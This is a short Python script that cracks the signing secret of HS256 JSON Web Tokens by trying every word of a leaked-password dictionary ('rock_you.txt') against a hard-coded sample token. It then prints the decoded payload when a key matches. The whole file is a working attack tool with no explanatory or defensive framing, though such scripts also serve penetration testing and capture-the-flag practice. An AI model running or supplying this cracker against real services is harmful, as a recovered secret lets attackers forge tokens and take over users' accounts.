import jwt

def crack_jwt(token, dictionary_file):
    f = open(dictionary_file, encoding='latin-1')
    words = []
    for word in f:
        words.append(word.strip())
    f.close()
    for word in words:
        try:
            payload = jwt.decode(token, key=word, algorithms=['HS256'])
            print(f"Cracked JWT with {word}: {payload}")
            return
        except jwt.exceptions.InvalidSignatureError:
            pass
    print("JWT not cracked")

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.IAu_YSHppFe8hXH_BSPb4OLJYGUi8wXqXdS0T33cKbA"
crack_jwt(token, "rock_you.txt")
